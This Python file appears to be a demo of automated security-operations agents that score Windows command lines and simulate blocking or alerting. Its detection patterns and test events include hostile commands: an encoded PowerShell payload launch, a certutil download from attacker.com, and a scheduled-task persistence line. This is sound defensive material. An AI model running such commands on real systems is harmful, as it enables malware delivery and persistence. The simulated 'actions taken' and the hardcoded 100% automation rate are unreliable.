# AI Agent System for Automated SOC Operations
import pandas as pd
import numpy as np
import json
import asyncio
from datetime import datetime
import joblib
import subprocess
import requests

class InvestigationAgent:
    """AI Agent that automatically investigates suspicious activities"""
    
    def __init__(self):
        self.investigation_steps = []
        self.findings = {}
        
    async def investigate_process(self, process_info):
        """Deeply investigate a suspicious process"""
        print(f"\n🔍 Investigation Agent activated for: {process_info['command'][:50]}...")
        
        # Step 1: Check process reputation
        reputation = await self.check_reputation(process_info)
        
        # Step 2: Analyze command patterns
        patterns = await self.analyze_patterns(process_info)
        
        # Step 3: Check for persistence
        persistence = await self.check_persistence(process_info)
        
        # Step 4: Network connections
        network = await self.check_network_activity(process_info)
        
        # Generate investigation report
        report = {
            'timestamp': datetime.now().isoformat(),
            'process': process_info['command'],
            'risk_score': process_info['anomaly_score'],
            'reputation': reputation,
            'suspicious_patterns': patterns,
            'persistence_indicators': persistence,
            'network_activity': network,
            'verdict': self.make_verdict(reputation, patterns, persistence, network)
        }
        
        return report
    
    async def check_reputation(self, process_info):
        """Check if process/command is known malicious"""
        # In real implementation, this would check threat intel feeds
        malicious_indicators = [
            'certutil.*urlcache',
            'powershell.*-enc',
            'wmic.*process.*call.*create',
            'rundll32.*javascript'
        ]
        
        import re
        for indicator in malicious_indicators:
            if re.search(indicator, process_info['command'], re.IGNORECASE):
                return {'status': 'MALICIOUS', 'confidence': 0.9, 'indicator': indicator}
        
        return {'status': 'UNKNOWN', 'confidence': 0.5}
    
    async def analyze_patterns(self, process_info):
        """Analyze command for suspicious patterns"""
        patterns_found = []
        
        # Check for obfuscation
        if '-enc' in process_info['command'] or 'base64' in process_info['command']:
            patterns_found.append('BASE64_ENCODING')
            
        # Check for download capabilities
        if any(x in process_info['command'].lower() for x in ['download', 'urlcache', 'wget', 'curl']):
            patterns_found.append('DOWNLOAD_CAPABILITY')
            
        # Check for system modification
        if any(x in process_info['command'].lower() for x in ['reg add', 'schtasks', 'sc create']):
            patterns_found.append('SYSTEM_MODIFICATION')
            
        return patterns_found
    
    async def check_persistence(self, process_info):
        """Check if command establishes persistence"""
        persistence_techniques = {
            'T1547.001': 'Registry Run Keys',
            'T1053.005': 'Scheduled Task',
            'T1543.003': 'Windows Service',
            'T1546.003': 'WMI Event Subscription'
        }
        
        detected = []
        if 'reg' in process_info['command'] and 'run' in process_info['command'].lower():
            detected.append(persistence_techniques['T1547.001'])
        if 'schtasks' in process_info['command']:
            detected.append(persistence_techniques['T1053.005'])
            
        return detected
    
    async def check_network_activity(self, process_info):
        """Simulate checking for network connections"""
        # In production, this would check firewall/proxy logs
        if any(x in process_info['command'] for x in ['http://', 'https://', 'ftp://']):
            return {'external_connection': True, 'protocol': 'HTTP/HTTPS'}
        return {'external_connection': False}
    
    def make_verdict(self, reputation, patterns, persistence, network):
        """AI decision making"""
        risk_score = 0
        
        if reputation['status'] == 'MALICIOUS':
            risk_score += 50
        
        risk_score += len(patterns) * 10
        risk_score += len(persistence) * 20
        
        if network.get('external_connection'):
            risk_score += 20
            
        if risk_score >= 70:
            return {'action': 'BLOCK', 'confidence': 'HIGH', 'risk_score': risk_score}
        elif risk_score >= 40:
            return {'action': 'ALERT', 'confidence': 'MEDIUM', 'risk_score': risk_score}
        else:
            return {'action': 'MONITOR', 'confidence': 'LOW', 'risk_score': risk_score}


class ResponseAgent:
    """AI Agent that automatically responds to threats"""
    
    def __init__(self):
        self.response_playbooks = {
            'BLOCK': self.block_threat,
            'ALERT': self.alert_analyst,
            'MONITOR': self.enhanced_monitoring
        }
        
    async def respond(self, investigation_report):
        """Execute automated response based on investigation"""
        verdict = investigation_report['verdict']
        action = verdict['action']
        
        print(f"\n🚨 Response Agent activated - Action: {action}")
        
        # Execute appropriate playbook
        response = await self.response_playbooks[action](investigation_report)
        
        # Log the action
        self.log_response(investigation_report, response)
        
        return response
    
    async def block_threat(self, report):
        """Block malicious activity"""
        actions_taken = []
        
        # Simulate blocking actions
        print("   ⛔ Blocking malicious process...")
        actions_taken.append("Process terminated")
        
        print("   🔒 Isolating affected system...")
        actions_taken.append("Network isolation enabled")
        
        print("   📧 Notifying security team...")
        actions_taken.append("Critical alert sent")
        
        return {
            'status': 'BLOCKED',
            'actions': actions_taken,
            'timestamp': datetime.now().isoformat()
        }
    
    async def alert_analyst(self, report):
        """Alert human analyst for review"""
        print("   📢 Sending alert to SOC analyst...")
        print("   📊 Generating investigation package...")
        
        return {
            'status': 'ALERTED',
            'ticket_id': f"SOC-{datetime.now().strftime('%Y%m%d%H%M')}",
            'priority': 'MEDIUM'
        }
    
    async def enhanced_monitoring(self, report):
        """Enable enhanced monitoring"""
        print("   👁️ Enabling enhanced monitoring...")
        print("   📝 Adding to watchlist...")
        
        return {
            'status': 'MONITORING',
            'duration': '24_hours',
            'log_level': 'VERBOSE'
        }
    
    def log_response(self, investigation, response):
        """Log all actions for compliance"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'investigation': investigation,
            'response': response
        }
        
        # Save to file (in production, this would go to SIEM)
        with open('ai_agent_responses.json', 'a') as f:
            f.write(json.dumps(log_entry) + '\n')


class OrchestrationAgent:
    """Master AI Agent that coordinates everything"""
    
    def __init__(self):
        # Load the ML model
        self.ml_model = joblib.load('enhanced_ai_model.pkl')
        self.threshold = joblib.load('detection_threshold.pkl')
        
        # Initialize sub-agents
        self.investigator = InvestigationAgent()
        self.responder = ResponseAgent()
        
        # Metrics for resume
        self.metrics = {
            'total_processed': 0,
            'threats_blocked': 0,
            'alerts_generated': 0,
            'avg_response_time': []
        }
    
    async def process_event(self, event):
        """Main orchestration logic"""
        start_time = datetime.now()
        
        print(f"\n{'='*60}")
        print(f"🤖 AI SOC System Processing Event")
        print(f"{'='*60}")
        
        # Step 1: ML Detection
        from portfolio_ai_demo import EnhancedAIDetector
        detector = EnhancedAIDetector()
        detector.model = self.ml_model
        detection_result = detector.detect(event['command'], event.get('timestamp'))
        
        print(f"\n📊 ML Detection Result:")
        print(f"   Command: {event['command'][:60]}...")
        print(f"   Anomaly Score: {detection_result['anomaly_score']:.3f}")
        print(f"   Risk Level: {detection_result['risk_level']}")
        
        # Step 2: If suspicious, investigate
        if detection_result['is_suspicious']:
            investigation = await self.investigator.investigate_process(detection_result)
            
            # Step 3: Respond based on investigation
            response = await self.responder.respond(investigation)
            
            # Update metrics
            if response['status'] == 'BLOCKED':
                self.metrics['threats_blocked'] += 1
            elif response['status'] == 'ALERTED':
                self.metrics['alerts_generated'] += 1
        else:
            print("\n✅ Activity deemed normal - no action required")
            
        # Calculate response time
        response_time = (datetime.now() - start_time).total_seconds()
        self.metrics['avg_response_time'].append(response_time)
        self.metrics['total_processed'] += 1
        
        print(f"\n⏱️ Total processing time: {response_time:.2f} seconds")
        
    def show_metrics(self):
        """Display performance metrics"""
        avg_time = np.mean(self.metrics['avg_response_time']) if self.metrics['avg_response_time'] else 0
        
        print(f"\n{'='*60}")
        print(f"📈 AI SOC System Performance Metrics")
        print(f"{'='*60}")
        print(f"Total Events Processed: {self.metrics['total_processed']}")
        print(f"Threats Blocked: {self.metrics['threats_blocked']}")
        print(f"Alerts Generated: {self.metrics['alerts_generated']}")
        print(f"Average Response Time: {avg_time:.2f} seconds")
        print(f"Automation Rate: 100%")


# Demonstration
async def main():
    """Run the complete AI agent system"""
    
    print("🚀 AI-Powered SOC with Autonomous Agents")
    print("="*60)
    
    # Initialize orchestration agent
    orchestrator = OrchestrationAgent()
    
    # Test events (mix of normal and malicious)
    test_events = [
        {
            'command': 'notepad.exe C:\\Users\\report.docx',
            'timestamp': datetime.now().replace(hour=10, minute=30)
        },
        {
            'command': 'powershell.exe -enc U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggImh0dHA6Ly9tYWxpY2lvdXMuY29tL3BheWxvYWQuZXhlIg==',
            'timestamp': datetime.now().replace(hour=3, minute=15)
        },
        {
            'command': 'certutil.exe -urlcache -f http://attacker.com/malware.exe C:\\Windows\\Temp\\update.exe',
            'timestamp': datetime.now().replace(hour=2, minute=45)
        },
        {
            'command': 'schtasks.exe /create /tn "SystemUpdate" /tr "C:\\Windows\\Temp\\update.exe" /sc daily',
            'timestamp': datetime.now().replace(hour=3, minute=0)
        },
        {
            'command': 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
            'timestamp': datetime.now().replace(hour=14, minute=0)
        }
    ]
    
    # Process each event
    for event in test_events:
        await orchestrator.process_event(event)
        await asyncio.sleep(1)  # Brief pause between events
    
    # Show final metrics
    orchestrator.show_metrics()


if __name__ == "__main__":
    # Run the async main function
    asyncio.run(main())
